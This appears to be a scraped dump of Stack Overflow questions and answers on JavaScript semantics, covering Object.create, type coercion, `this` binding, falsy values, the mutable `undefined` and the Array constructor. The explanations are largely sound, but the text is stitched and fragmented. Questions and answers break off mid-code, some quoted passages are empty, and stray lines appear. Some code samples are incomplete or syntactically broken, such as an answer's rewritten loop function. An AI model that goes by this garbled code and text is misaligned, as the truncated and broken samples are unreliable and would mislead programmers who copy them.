<p>There's a difference here, with <code>Object.create</code> you can create an object that doesn't inherit from anything, <code>Object.create(null);</code>, on the other hand, if you set <code>SomeConstructor.prototype = null;</code> the newly created object will inherit from <code>Object.prototype</code>.</p>

<blockquote>
  <p>You cannot create closures with the Object.create syntax as you would with the functional syntax. This is logical given the lexical (vs block) type scope of JavaScript.</p>
</blockquote>

<p>Well, you can create closures, e.g. using property descriptors argument:</p>

<pre><code>var o = Object.create({inherited: 1}, {
  foo: {
    get: (function () { // a closure
      var closured = 'foo';
      return function () {
        return closured+'bar';
      };
    })()
  }
});

o.foo; // ""foobar""
</code></pre>

<p>Note that I'm talking about the ECMAScript 5th Edition <a href=""http://sideshowbarker.github.com/es5-spec/#x15.2.3.5""><code>Object.create</code></a> method, not the Crockford's shim.</p>

<p>The method is starting to be natively implemented on latest browsers, check this <a href=""http://kangax.github.com/es5-compat-table/"">compatibility table</a>.</p>

"<pre><code>alert((![]+[])[+[]]+(![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]);
</code></pre>

<p>The output of this code is: <code>fail</code>. Why?  </p>

<p>By the way, <code>(![]+[])[+!+[]] = 'false'[0]</code>, right?. But why <code>![]+[] == ""false""</code> and why <code>+!+[] == 1</code> ?</p>
","5445","","<p>As @Mauricio commented <code>(![]+[])[+[]]</code> is ""f"" (the first char of ""false""), <code>(![]+[])[+!+[]])</code> is ""a"", etc...</p>

<p>How does it work?</p>

<p>Let's examine the first character, 'f':</p>

<pre><code>(![]+[])[+[]]; // 'f'
</code></pre>

<p>The first part of the expression—between parentheses—is composed by <code>![]+[]</code>, the first operand of the Addition operator is <code>![]</code> and it will produce <code>false</code>, because an array object—as any other Object instance—is <em>truthy</em>, and applying the Logical (!) NOT unary operator, it produces the value <code>false</code>, for example.</p>

<pre><code>![]; // false, it was truthy
!{}; // false, it was truthy
!0;  // true, it was falsey
!NaN;  // true, it was falsey
</code></pre>

<p>After it, we have the second operand of the addition, an empty Array, <code>[]</code>, this is made just to convert the <code>false</code> value to String, because the string representation of an empty array is just an empty string, is equivalent to:</p>

<pre><code>false+[]; // ""false""
false+''; // ""false""
</code></pre>

<p>The last part, the pair of square brackets after the parentheses, they are the property accessor, and they receive an expression, which is formed by the Unary Plus Operator applied to an empty array again.</p>

<p>What the Unary Plus Operator does is type conversion, to <code>Number</code>, for example:</p>

<pre><code>typeof +""20""; // ""number""
</code></pre>

<p>One more time, this is applied to an empty Array, and as I said before, the String representation of an Array is an empty string, and when you convert an empty string to Number, it is converted to zero:</p>

<pre><code>+[]; // 0, because
+[].toString(); // 0, because
+""""; // 0
</code></pre>

<p>Therefore we can ""decode"" the expression to in some steps:</p>

<pre><code>(![]+[])[+[]];
(false+[])[+[]];
(false+'')[+[]];
(false+'')[0];
('false')[0];  // ""f""
</code></pre>

<p>Note that accessing characters by using the bracket notation on String values was not part of the ECMAScript 3rd. Edition Specification, (that's why the <code>charAt</code> method existed).</p>

<p>However this kind of ""index properties"" that represent the characters of a string were standardized on ECMAScript 5, and even before the standardization the feature was available in a good number of browsers (even in IE8 (standards mode)).</p>
"
"<p>Let's assume we have a text-box on the page:  </p>

<pre><code>&lt;input type=""text""&gt;  
</code></pre>

<p>The visitor types in some characters, and we read those characters via the <code>value</code> property of the text-box.  </p>

<p>Now, let's say that the text-box represents a numeric value. I cannot define such a thing on the text-box - its value is always going to be a string value. What I can do is, convert that sting value into a numeric value:  </p>

<pre><code>Number(input.value)
</code></pre>

<p>However, the input value is treated as a <em>StringNumericLiteral</em>, and not a <em>NumericLiteral</em>. That means that these input values are allowed (although they are not numeric literals in JavaScript):</p>

<ul>
<li>values with leading zeros (like ""000003"")</li>
<li>the ""Infinity"" value</li>
<li>values with a plus sign (like ""+3"")</li>
</ul>

<p>Now, let us say that - for the sake of the argument - I really want to read the input value as <em>NumericLiteral</em>. I don't want numbers with leading zeros or the + sign, etc. I was thinking how I could accomplish this, and this is what I came up with:  </p>

<pre><code>try  {                  
    var n = JSON.parse('{ ""n"": ' + this.value + ' }').n;
    if (typeof n !== ""number"") {
        throw ""error"";
    }
    // n is a Number value that represents the value of the text-box        
} catch(e) {}
</code></pre>

<p>This is a simplified version of the code, a live demo is available here:<br>
<a href=""http://vidasp.net/tinydemos/input-as-number.html"" rel=""nofollow"">http://vidasp.net/tinydemos/input-as-number.html</a>  </p>

<p>Note: I use try-catch because if the input value is not a valid JSON value, the JSON.parse call will fail (throw an error).  </p>

<p>So, what do you think of this method. Does it have flaws?</p>

<p>(One downside is that hex numeric values cannot be read, because JSON does not allow them.)  </p>

<p><em><strong>I just realized ...</em></strong>  </p>

<p>... that the reason why I was trying to do this was not to actually read the input as a number. What I wanted is to check whether the value complied to the NumericLiteral grammar - which is something that a regexp check can do easily. </p>
","5445","","<p>With <code>JSON.parse</code> you will be processing your value as a <a href=""http://sideshowbarker.github.com/es5-spec/#x15.12.1.1"" rel=""nofollow""><code>JSONNumber</code></a> token, not really as a <a href=""http://sideshowbarker.github.com/es5-spec/#x7.8.3"" rel=""nofollow""><code>NumericLiteral</code></a>.</p>

<p>There are differences between <code>JSONNumber</code> and <code>NumericLiteral</code>, <code>JSONNumber</code> doesn't allow leading zeros (no octals), nor hexadecimal literals, nor a leading dot (<code>3.</code>), or the opposite, a dot followed by the fraction digits (<code>.3</code>), moreover <code>JSON.parse</code> is really buggy across implementations, regarding numeric values, in SpiderMonkey (and in the json2.js library) <code>JSON.parse('01')</code> will not throw as one can expect.</p>

<p>You could do validation to ensure the string complies with the <code>NumericLiteral</code> grammar, and if it does, you can use either <code>eval</code> or the <code>Function</code> constructor to really convert your value, for example:</p>

<pre><code>var numericLiteral = (function () {
  var numericLiteralSyntax = new RegExp([
    '^0x[\\da-fA-F]+$', // HexIntegerLiteral
    '^0[0-7]+$',        // OctalIntegerLiteral
    '^(?:\\.\\d+|(?:0|[1-9]\\d*)(?:\\.\\d*)?)(?:[eE][+-]?\\d+)?$'//DecimalLiteral
  ].join('|'));

  return function (value) {
    if (typeof value != 'string') { throw TypeError('value must be a String'); }

    if (numericLiteralSyntax.test(value)) {
      return Function('return ' + value)(); // a NumericLiteral, evaluate it
    }
    throw SyntaxError('Invalid NumericLiteral'); // Not a NumericLiteral
  }
})();

numericLiteral('0xFF'); // 255, an HexIntegerLiteral
numericLiteral('2e1'); // 20, DecimalLiteral with ExponentPart
numericLiteral('3.'); // 3
numericLiteral('.3'); // 0.3
numericLiteral('3.1416'); // 3.1416
numericLiteral('00010'); // 8, an OctalIntegerLiteral

"<p>Saw some JS notation today that I've never seen before, bear with me if it is something common that everyone knows.</p>

<pre><code>var cookiepath = cookiepath || '';
</code></pre>

<p>Now, is this just saying, if a variable named cookiepath already exists, set it to cookiepath or if it doesn't, set it to ''?</p>
","5445","","<p>The <code>cookiepath</code> variable is being declared, an initialized.</p>

<p>The <code>var</code> statement doesn't make any harm if an identifier was already declared in the current lexical scope.</p>

<p>If <code>cookiepath</code> wasn't declared yet, the <code>var</code> statement, before run-time, will initialize the variable to <code>undefined</code>.</p>

<p>After that, in run-time, the assignment is made, if it's value is <em>falsy</em> (other than <code>null</code>, <code>undefined</code>, an empty string, <code>0</code>, <code>NaN</code>, or <code>false</code>)  it's set to an empty string.</p>

<p>Keep in mind that you have access to the <code>cookiepath</code> variable in the <strong>local scope</strong>.</p>

(function () {
    var cookiepath = cookiepath || """";

<p>In the above example, we have a global <code>cookiepath</code> variable, on the global scope, but when the function is executed, a local <code>cookiepath</code> variable will be declared on the scope of the function, and this shadows the value of the outer scope, and this behavior is noticeable even before the <code>var</code> statement in the function, e.g.:</p>

<p>Why is it necessary to wrap the script in a function, and what args does can that function receive?</p>
","5445","","<p>The args received are:</p>

<pre><code>(function($,window,undefined){
  //..
})(jQuery, window);
</code></pre>

<p><strong><code>$</code></strong>: A reference for the jQuery object, often made for being able to refer to it as the <code>$</code> alias, since in the outer scope the code might be in ""compatibility mode"".</p>

<p><strong><code>window</code></strong>: The <code>window</code> argument is often used to <em>shorten</em> identifier lookup. In browser scripting <code>window</code> is a property of the global object, in order to resolve it, the Identifier Resolution Process has to inspect every scope, until it reaches the global scope. If we add <code>window</code> as an argument, the lookup will be short, no matter how nested is our function.</p>

<p>In non-browser scripting environments, the <code>window</code> identifier doesn't even exist, and that pattern is a common way to keep track of the Global object, e.g.:</p>

<pre><code>(function (global, undefined) {
  //..
})(this);

<p>Note that the <code>this</code> value for <em>global code</em> (not function code), always refers to the global object.</p>

<p><strong><code>undefined</code></strong>: At last but not least, the <code>undefined</code> argument, it is used as a ""security measure"", because <code>undefined</code> is also a property of the Global object, and in the ECMAScript 3rd Edition Specification, its value is mutable, immagine:</p>

<pre><code>undefined = true;
</code></pre>

<p>That would mess up with your code, but if we have an argument, and we don't pass anything to it, it will hold the <em>undefined value</em>.</p>

"<p>According to Crockford's <a href=""http://www.json.org/"">json.org</a>, a json <em>object</em> is made up of <em>members</em>, which is made up of <em>pairs</em>.</p>

<blockquote>
  <p>A string is a sequence of zero or more

<p>as opposed to the invalid:</p>

<pre><code>{

","5445","","<p>The real reason about why JSON keys should be in quotes, relies in the semantics of Identifiers of ECMAScript 3.</p>

<p><a href=""http://bclary.com/2004/11/07/#a-7.5.1"">Reserved words</a> cannot be used as <em>property names</em> in Object Literals without quotes, for example:</p>

({true: 0}) // SyntaxError
// etc...

<p>While if you use quotes the property names are valid:</p>

<pre><code>({""function"": 0}) // Ok
({""if"": 0}) // Ok
({""true"": 0}) // Ok
</code></pre>

<p>The own Crockford explains it in <a href=""http://developer.yahoo.com/yui/theater/video.php?v=crockford-json"">this talk</a>, they wanted to keep the JSON standard simple, and they wouldn't like to have all those semantic restrictions on it:</p>

<blockquote>
  <p>....</p>
  
  <p>That was when we discovered the
  unquoted name problem. It turns out
  ECMA Script 3 has a whack reserved
  word policy. Reserved words must be
  quoted in the key position, which is
  really a nuisance. When I got around
  to formulizing this into a standard, I
  didn't want to have to put all of the
  reserved words in the standard,
  because it would look really stupid.</p>
  
  <p>At the time, I was trying to convince
  people: yeah, you can write
  applications in JavaScript, it's
  actually going to work and it's a good
  language. I didn't want to say, then,
  at the same time: and look at this
  really stupid thing they did! So I
  decided, instead, let's just quote the
  keys.<br>
  That way, we don't have to tell
  anybody about how whack it is.</p>
  
  <p>That's why, to this day, keys are quoted in
  JSON.</p>
  
  <p>...</p>
</blockquote>

<p>The ECMAScript 5th Edition Standard fixes this, now in an ES5 implementation, even reserved words can be used without quotes, in both, Object literals and member access (<code>obj.function</code> Ok in ES5).</p>

"<p>Hopefully I can ask this in an understandable way...</p>

                &lt;a href=""http://somelink""&gt;Link Element&lt;/a&gt;&lt;img src=""img.jpg"" alt=""img"" /&gt;
                &lt;select id=""my_select""&gt;&lt;option value=""1""&gt;1&lt;/option&gt;&lt;/select&gt;
            &lt;/div&gt;
        &lt;/div&gt;

function getFilteredElements() {
    var tabContent = getElementsByClass(""tabContentWrap"", document.getElementById(tabWrapId), ""div"");

    for (var j = 0; j &lt; tabContent.length; j++){
        tabContentLinks = tabContent[j].getElementsByTagName('*');
        for (var k = 0; k &lt; tabContentLinks.length; k++){
            // Here i attempt to filter the collection
            if (tabContentLinks[k] == '[object HTMLSelectElement]') {
                alert(""found select list"");
            }
         }
     }
 }
</code></pre>

<p>Which works fine in Mozilla but not in Internet Explorer 8, <code>tabContentLinks[k]</code> returns <code>[object]</code> instead of <code>[object 'ObjectType']</code></p>

<p>So I investigated and discovered that you can use <code>Object.prototype.toString.call(object)</code> to get the object type, which again works fine in Mozilla but returns <code>[object Object]</code> in IE8...</p>

<p>which runs the following function:</p>

<pre><code>function get_type(thing){
    if (thing === null) return ""[object Null]"";
    // special case

<p>But this just returns <code>[object Object]</code></p>

<p>Does <code>Object.prototype.toString.call()</code> ever return the type of object in IE or am I very far off and barking up a lamppost instead of a tree?</p>
","5445","","<p>Well, first of all I want to tell you that <code>Object.prototype.toString</code> returns the value of the object's internal <code>[[Class]]</code> property, it isn't really a <em>Type</em>.</p>

<p>The value of this internal property represents the <em>specification defined classification</em> of an object (more info <a href=""http://stackoverflow.com/questions/3250379/what-is-the-call-function-doing-in-this-javascript-statement/3250415#3250415"">here</a>).</p>

<p>Javascript has only 6 <em>language types</em>: <em>Object, String, Number, Boolean, Null and Undefined</em>, that's it.</p>

<p>The value of the <code>[[Class]]</code> internal property for host objects -as DOM elements- can be <strong>anything</strong>, it is completely <em>implementation-dependent</em>, on built-in objects is safe to use it -except with some exceptions in IE as @Alex pointed out in the article linked in his answer-.</p>

<p>You are working with DOM elements, and you want to figure out what kind of node it is, my suggestion to this, is to simply use the <code>nodeName</code> property <sub>(please avoid using <code>tagName</code>)</sub>.</p>

<p>The <code>nodeName</code> property contains the name of the node you are dealing it, in upper case, therefore you could use it as this:</p>

<pre><code>function getFilteredElements() {
  var tabContent = getElementsByClass(""tabContentWrap"", 
  document.getElementById(tabWrapId), ""div"");

  for (var j = 0; j &lt; tabContent.length; j++){
    tabContentLinks = tabContent[j].getElementsByTagName('*');
    for (var k = 0; k &lt; tabContentLinks.length; k++){
      // Here i attempt to filter the collection
      if (tabContentLinks[k].nodeName == 'SELECT') { // &lt;- SELECT elements
        alert(""found select list"");
      }
    }
  }
}

<p>Thanks</p>
","5445","","<p>The <code>this</code> value is set <strong>implicitly</strong> depending on <strong>how the function is invoked</strong>, there are three cases where this happens:</p>

<ol>
<li><p>When a reference with no base-object, or a non-reference is invoked:</p>

<pre><code>myFn();             // the myFn reference has no base object
(function () {})(); // non-reference
</code></pre>

<p>The <code>this</code> value will point to the global object <sup><strong>1</strong></sup></p></li>
<li><p>When a reference contains a base object, for example:</p>

<pre><code>myObj.method();
</code></pre>

<p>The <code>this</code> value inside <code>method</code> will point to <code>myObj</code>.</p></li>
<li><p>When the <code>new</code> operator is used:</p>

<pre><code>var obj = new Foo();
</code></pre>

<p>The <code>this</code> value inside the <code>Foo</code> function, will point to a newly created object that inherits from <code>Foo.prototype</code>.</p></li>
</ol>

<p>The <code>this</code> value can be set also <strong>explicitly</strong>, by using the <a href=""https://developer.mozilla.org/en/JavaScript/Reference/Global_Objects/function/call""><code>call</code></a> and <a href=""https://developer.mozilla.org/en/JavaScript/Reference/Global_Objects/function/apply""><code>apply</code></a> methods, for example, with <code>call</code>:</p>

<pre><code>function test(a) {
  return alert(this + a);
}

test.call(""hello"", "" world""); // alerts ""hello world""
</code></pre>

<p>Or with <code>apply</code> if we need to ""apply"" a set of arguments from an array to a function:</p>

<pre><code>function test(a, b) {
  return alert(this + a + b);
}

var args = [""my "", ""world ""];
test.apply(""hello "", args); // alerts ""hello my world""

<hr>

<p><strong><sup>[1]</sup></strong> This has changed on the new <a href=""http://dmitrysoshnikov.com/ecmascript/es5-chapter-2-strict-mode/"">ECMAScript 5th Strict Mode</a>, now when a function reference with no <em>base object</em>, or a non-reference is invoked (as the first case), the <code>this</code> value will contain <code>undefined</code>. </p>

<p>This was made because when working with constructor functions, people often forgot to use the <code>new</code> operator when calling the constructor.</p>

<p>When that happened, the <code>this</code> value pointed to the global object, and that ended up adding unwanted global properties.</p>

<p>Now on strict mode, <code>this</code> will contain undefined, and if property lookup is made on it (<code>this.foo = 'foo'</code>) we will have a nice <code>TypeError</code> exception, instead of having a global <code>foo</code> property.</p>

"<p>Can anyone explain why the following two statements both evaluate as <strong>true</strong>?</p>

<pre><code>[] == false
</code></pre>

<p>and</p>

<pre><code>!![]
</code></pre>

<p>This question is purely out of curiosity of why this happens and not about how to best test if an array is empty. </p>
","5445","","<p>The first one:</p>

<pre><code>[] == false
</code></pre>

<p>The <code>==</code> operator does type conversion to its operands, in this case the both sides are converted to Number, the steps taken on the <a href=""http://bclary.com/2004/11/07/#a-11.9.3"">Abstract Equality Comparison Algorithm</a> would be:</p>

<ul>
<li>object == boolean</li>
<li>object == number</li>
<li>string == number</li>
<li>number == number</li>
</ul>

<p>In code:</p>

<pre><code>[] == false; // convert false to Number
[] == 0;     // convert [] to Primitive (toString/valueOf)
"""" == 0;     // convert """" to Number
0  == 0;     // end
</code></pre>

<p>The second comparison, <code>[]</code> is converted to primitive, their <code>valueOf</code> and <code>toString</code> methods are executed, but since <code>valueOf</code> on Array objects, returns the object itself (is inherited from <code>Object.prototype</code>), then the <code>toString</code> method is used.</p>

<p>At the end as you see, both operands are converted to Number, and both yield zero, for example:</p>

<pre><code>Number([]) == 0;
Number(false) == 0;
</code></pre>

<p>And empty array produces zero when converted to Number because its string representation is an empty string:</p>

<pre><code>[].toString(); // """"
</code></pre>

<p>And an empty string converted to Number, yields zero:</p>

<pre><code>+""""; // 0
</code></pre>

<p>Now, the double negation (<code>!![]</code>) produces true because all object instances are truthy:</p>

<pre><code>![];  // false, [] is truthy
!![]; // true, negation
</code></pre>

<p>The only values that are <em>falsey</em> are:</p>

<ul>
<li><code>null</code></li>
<li><code>undefined</code></li>
<li><code>0</code></li>
<li><code>NaN</code></li>
<li><code>""""</code> (an empty string)</li>
<li><code>false</code></li>
</ul>

<p>Anything else will produce <code>true</code> when converted to Boolean.</p>

<p>As @elusive cleverly summed up in his comment below, I mistakingly assumed that <code>window.x</code> and <code>window[x]</code> are equivalent. That is not correct. <code>window.x</code> is equivalent to <code>window[""x""]</code>.</p>
","5445","","<p>The behavior that you are experiencing is because the <code>undefined</code> property of the Global object, is mutable on any <em>ECMAScript 3</em> based implementation. (latest Chrome versions are implementing ES5, but this behavior is still present).</p>

<p>Let's examine the second snippet:</p>

<pre><code>var x = window.foo;
window[x] = null;
alert( window.bar === undefined );
</code></pre>

<p>The <code>x</code> variable will hold the <code>undefined</code> value, since the <code>foo</code> property does not exist.</p>

<p>By assigning <code>window[x] = null</code>, you are overriding the value of the <code>undefined</code> property:</p>

<pre><code>window[x] = null; // is equivalent to
window['undefined'] = null; // or
window.undefined = null; //
</code></pre>

<p>(In your first snippet, when you assign <code>window.x = null</code>, you are creating a property named <code>""x""</code> on the <code>window</code> object.)</p>

<p>Therefore (in your second snippet), the <code>undefined</code> property will hold <code>null</code>, and <code>window.bar</code> will produce <code>undefined</code>:</p>

<pre><code>alert( window.bar === undefined ); // false
alert( undefined  === null ); // false
</code></pre>

<p>The <code>undefined</code> property was not specified as <code>{ ReadOnly }</code> on ECMAScript 3, (along with his friends <code>NaN</code>, <code>Infinity</code>).</p>

"<p>It's very common in Javascript to come across Array-Like objects with some similarities to the build in Array type but without all of its methods or features.  So much so that there are some tricks to convert Array-Like objects to ""real"" arrays for further manipulation.</p>

<p>The questions is why is this pattern so common?  Why not prefer the built-in Array type in all these cases?</p>
","5445","","<p>Well, speaking about <em>core</em> Javascript objects, the <code>arguments</code> is a good example to talk about.</p>

<p>In this case it has been an <em>array-like object</em> since the beginning, appeared in the ECMAScript 1th Edition Specification already as a simple object.</p>

<p>Why? I think at that time there were only four built-in <code>Array</code> methods, and maybe the designer didn't think it worthed too much, later the change was proposed, but Microsoft (part of the TC39 committee) didn't approved the change, the fear of <em>breaking the web</em> has always been present.</p>

<p>Now going to <em>host objects</em>, the DOM, <code>NodeLists</code> come to my mind, I think they didn't wanted to use the native <code>Array</code> type due the dynamic behavior of these objects.</p>

<p><code>NodeLists</code> generally are <em>live</em> objects, their structure is reflects any change on the underlying DOM structure...</p>

<p>Personally I like array-objects, because they are really lightweight, before ECMAScript 5, there were a lot of restrictions in core methods, regarding the usage of user-defined array-like objects.</p>

<p>For example, the <code>apply</code> method of function objects, in ECMAScript &lt;= 3, allowed only either a real array or an arguments object as its second argument, now in ES5, the following is possible:</p>

<pre><code>var arrayLike = {0: 'hello ', 1:'world', length:2};
(function (a,b) { alert(a+b); }).apply(null, arrayLike);

"<p>Javascript seems to take a few liberties when it comes to its built-in types and objects.</p>

<p>To get at the functions inside the Array type you can do this:</p>

<pre><code>&gt; Array().slice
  function slice() {
     [native code]
  }
</code></pre>

<p>So here Array looks like a standard function that is being used as a constructor.  Except... slice is not a member function of the Array() function, it's a member function of the Array object.</p>

<p>Another unusual thing about Array() is it seems to return an Array object whether you call it with new() or not:</p>

<pre><code>&gt; var a = Array()
undefined
&gt; a
[]
&gt; a.length
0

&gt; var b = new Array()
undefined
&gt; b
[]
&gt; b.length
0

<p>Math on the other hand seems to be a built in singleton object that is always present (ie: no need to instantiate).  So you would use Math.min.apply while with Array using Array().slice.apply.</p>

<p>My question is what makes Array() so different than either a constructor you would write yourself and the other built-in objects of Javascript.</p>
","5445","","<p>I'll make some comments inline, quoting your question:</p>

<blockquote>

</blockquote>

<p>More exactly, <code>slice</code> is a member of the <code>Array.prototype</code> object, by executing <code>Array()</code>, you are creating a new array object, that inherits from <code>Array.prototype</code>, that's why <code>slice</code> is available.</p>

<blockquote>
  <p>Another unusual thing about Array() is it seems to return an Array object whether you call it with new() or not:</p>

<p>This behavior is shared also by other built-in constructors, for example <code>Function</code>:</p>

<pre><code>var fn = Function('return ""foo"";');
</code></pre>

<p>Is equivalent to:</p>

<pre><code>var fn = new Function('return ""foo"";');

<pre><code>new Number(""20"");        // produces a Number object
typeof new Number(""20""); // ""object""

Number(""20"");            // makes type conversion

this:[object global]

","5445","","<p>The key of knowing the implicit behavior of <code>this</code> on function calls, relies on knowing how the <a href=""http://ecma262-5.com/ELS5_HTML.htm#Section_8.7""><em>Reference Type</em></a> woks.</p>

<p>The <em>Reference Type</em> consists of two components (in ECMAScript 3), the <em>base object</em> and the <em>property name</em> (in ECMAScript 5, it has a third component the <em>strict</em> flag -I will talk about strict mode later- <sup>(1)</sup>). </p>

<p>When a <a href=""http://ecma262-5.com/ELS5_HTML.htm#Section_11.2.3"">function is invoked</a>, the <code>this</code> value is determined implicitly by getting the base object of the reference (by the internal <code>GetBase</code> operation).</p>

<p>For example, in the <code>foo.bar</code> reference, the <em>base object</em> is <code>foo</code> and the <em>property name</em> is <code>""bar""</code>:</p>

<pre><code>foo.bar(); // `this` will point to `foo`
</code></pre>

<p>When you do an assignment, the reference is lost, we don't have anymore a <em>base object</em> and a <em>property name</em>, we just have a <strong>value</strong>:</p>

<pre><code>(f=foo.bar)(); // `this` will point to the global object
</code></pre>

<p>It doesn't happen only with assignments, it happens with other operations that use the internal <a href=""http://ecma262-5.com/ELS5_HTML.htm#Section_8.7.1""><code>GetValue</code></a> operation:</p>

<pre><code>// `this` will point to the global object    
(0, foo.bar)();   // The Comma Operator
(0 || foo.bar)(); // Binary Logical Operators
(1 &amp;&amp; foo.bar)();
// etc..
</code></pre>

<p>It doesn't happens for example if you surround a <em>reference</em> with parentheses (formally called <a href=""http://ecma262-5.com/ELS5_HTML.htm#Section_11.1.6"">The Grouping Operator</a>):</p>

<pre><code>(foo.bar)(); // `this` will point to `foo`
</code></pre>

<p>The Grouping Operator (again, the parentheses ;) doesn't use <code>GetValue</code> internally, this was designed in that way because the <code>typeof</code> and <code>delete</code> operators are allowed to work with <em>parenthesised expressions</em>:</p>

<pre><code>delete (foo.bar);
</code></pre>

<p>If the grouping operator used <code>GetValue</code>, the <code>delete</code> operator would be unable to get a <em>base object</em> where to remove the property <code>bar</code>.</p>

<p>Returning to the implicit <code>this</code> value, there are some tricky cases, for example, using the <code>with</code> statement:</p>

<pre><code>with (foo) {
  bar(); // `this` will refer to `foo` !
}
</code></pre>

<p>As you can see, invoking <code>bar();</code> inside the with block, will still bind the <code>this</code> value to the <code>foo</code> object.</p>

<p>The <code>this</code> value isn't set from the <em>reference</em>, it comes from the current <em>Environment Record</em> (I'll maybe write something about it later) introduced by the <code>with</code> statement.</p>

<p>Also, as you may note, for <em>non-references</em>, the <code>this</code> value will point to the global object, for example:</p>

<pre><code>(function () {})(); // this will point to the global object
</code></pre>

<p>We just have a <em>value</em>, not a reference (<em>Remember, a reference is a resolved name binding</em>).</p>

<hr>

<p><sup>(1)</sup><strong>NOTE:</strong> On ECMAScript 5 <em>Strict Mode</em>, the <code>this</code> value will be <code>undefined</code> for <strong>all</strong> the cases described where the <code>this</code> value is set implicitly to the Global object.</p>

<p>This was made as a <em>security measure</em> mostly due the fact that people often forgot to use the <code>new</code> operator when invoking constructor functions, causing a bad behavior and pollution on the global scope.</p>

<p>For example:</p>

<pre><code>function Foo () {
  this.prop = 'foo';
}
Foo(); // no `new` operator, boom!
</code></pre>

<p>As you known now, the <code>Foo</code> reference doesn't have a direct <em>base object</em>, <code>this</code> will point to the global object and it will unintentionally create a property on it.</p>

<p>On Strict Mode, the code would simply give you a <code>TypeError</code>, because the <code>this</code> value would be <code>undefined</code>.</p>

<p>Also as you may remember in the beginning I mentioned that the Reference Type has a third component, the <code>strict</code> flag.</p>

<p>Your original example: </p>

<pre><code>(f=foo.bar)();
</code></pre>

<p>Would probably not even work on Strict Mode, because assignments to undeclared identifiers (such as <code>f</code> <em>seems</em>) are disallowed, (another security measure to avoid global object pollution).</p>

"<p>Is there any performance hit for writing a function such that local <code>var</code> statements are replaced with arguments? Example:</p>

<pre><code>function howManyMatch(arr, pattern, /*ignored:*/ i, l, total) {
  l = arr.length;
  total = 0;
  for (i = 0, i &lt; l; i++) {
    if (pattern.test(arr[i]))

<p>Some advantages:</p>

<ul>
<li>smaller minified size: no <code>var</code> statements;</li>
<li>less programmer time spent trying to use as few <code>var</code>s as possible</li>
<li>all local vars defined in one place</li>
</ul>

<p>...and disadvantages:</p>

<ul>
<li><code>arguments</code> can be altered in unexpected ways. See below</li>
<li>less clear in body that vars are local</li>
<li>confusing to see arguments that don't do anything</li>
<li>if someone unknowingly removes them, your code writes to globals</li>
</ul>

<p>Still it might be an easy way for a minifier to automatically squeeze out more bits.</p>

<p><strong>Update:</strong> a big disadvantage not mentioned so far: If a function is called with N parameters, the first N items in <code>arguments</code> will be binded to the first N identifiers in the argument list (see the <a href=""http://bclary.com/2004/11/07/#a-10.1.8"" rel=""nofollow"">last bullet in 10.1.8</a>). Consider this:</p>

<pre><code>function processStuff(/*ignored:*/i, j, k) {
    // use i/j/k to loop
    // do stuff with the arguments pseudo-array
}
</code></pre>

<p>In the above example, if you called <code>processStuff(stuff1, stuff2)</code>, setting <code>i</code> and <code>j</code> would overwrite <code>arguments[0]</code> and <code>arguments[1]</code> respectively.</p>
","5445","","<p>I wouldn't do it for many of the reasons you already know, personally I don't like the fact of mixing the <em>semantic meaning</em> of arguments vs. variables, although at the implementation level, when the function is executed, they are just properties of the current variable object, they have different meaning IMO.</p>

<p>Now, answering the question, <em>I don't think there's any performance impact</em>.</p>

<p>Let me talk a bit about the the <a href=""http://bclary.com/2004/11/07/#a-10.1.3"" rel=""nofollow"">Variable Instantiation process</a>, it takes place for Function Code, just before the function is executed (commonly known as ""hoisting""), at first, all the <em>Formal Parameters</em> described for the function are bound to the current Variable Object (the current scope), and they are initialized with the values passed in the function call or <code>undefined</code> if not supplied.</p>

<p>After that, all the identifiers that belong to all <code>var</code> statements within the function are declared in the current scope, and initialized with <code>undefined</code> (note that the assignments are made after this, the function body isn't actually being executed yet).</p>

<p>The third step are FunctionDeclarations, all the identifiers of function declarations are bound to the local scope, if an identifier was previously declared, its value is replaced, for example:</p>

<pre><code>(function (a) {
  return typeof a; // ""function"", not ""string""

  function a () {}

})('foo');  // &lt;-- passing a string
</code></pre>

<p>I would recommend instead simply to use a single <code>var</code> statement, at the top of the function:</p>

<pre><code>function howManyMatch(arr, pattern) {
  var l = arr.length,
      total = 0, i;
  for (i = 0, i &lt; l; i++) {
    if pattern.test(arr[i]) &amp;&amp; total++;
  return total;
}
</code></pre>

<p>That doesn't just organize your code, it would help you to prevent unwanted results due the function-only scope of JavaScript and the ""hoisting"" nature of <code>var</code>, some tools like <a href=""http://www.jslint.com/lint.html#scope"" rel=""nofollow"">JSLint encourage</a> this also.</p>

"<p>I see <strike>four</strike> five options to initialize an array to a specific length in JS, (the last one is a stretch, I know):</p>

<pre><code>var a = []; a.length = 5;

var a = Array(5);

var a = []; a[4] = undefined;

var a = new Array(5);

function makeArrayToLength(length, default){
    var a = [], i = 0;
    for(; i &lt; length; i++){
        a[i] = default;
    }
    return a;
}
</code></pre>

<p>I definitely want to (and do) use the literal whenever possible, but I'm in a situation where the defining aspect of a particular array is its length, so I'm leaning towards Array(5). Is the first example equivalent to the second in terms of end result? I realize it's not equivalent in the execution.</p>
","5445","","<p>The first two, and the third examples are equivalent, at the end they produce an <code>Array</code> object with only one <em>own property</em>, <code>length</code>, containing <code>5</code> as its value.</p>

<p>When you call the <code>Array</code> constructor using a single numeric argument (like <code>Array(5);</code>), the newly created object will contain that number as its <code>length</code> property, the <em>index properties</em> aren't created:</p>

<pre><code>var a = Array(5);
a.hasOwnProperty('0'); // false
</code></pre>

<p>The second example produces just the same:</p>

<pre><code>var a = [];
a.length = 5;
a.hasOwnProperty('0'); // false
</code></pre>

<p>About the third example, it isn't equivalent because it will create a property on the array object, even though its value is <code>undefined</code>:</p>

<pre><code>var a = []; a[4] = undefined;
a.hasOwnProperty('4'); // true
</code></pre>

<p>The fourth example:</p>

<pre><code>var a = new Array(5);
</code></pre>

<p>Is just exactly the same as the second one (<code>var a = Array(5);</code>), there's no difference between using the <code>Array</code> constructor with or without the <code>new</code> operator, in the second example you are <a href=""http://ecma262-5.com/ELS5_HTML.htm#Section_15.4.1"" rel=""nofollow"">calling the <code>Array</code> constructor as a function</a>.</p>

<p>And finally, about your <code>makeArrayToLength</code> function, by now I think you know isn't equivalent at all, since all the ""index properties"" are initialized to a ""default"" value. <sub>(BTW don't use <code>default</code> as Identifier, it's a Keyword...)</sub></p>

<p>The <code>Array</code> constructor is usually avoided because it can have different behaviors depending the argument used, for example:</p>

<pre><code>Array(""5""); // one element array, ([""5""])
Array(5);   // empty array, length = 5
// v.s.
[""5""]       // one element array
[5]         // one element array
</code></pre>

<p>Also, the <code>Array</code> constructor could be overriden, while array literals will always work.</p>

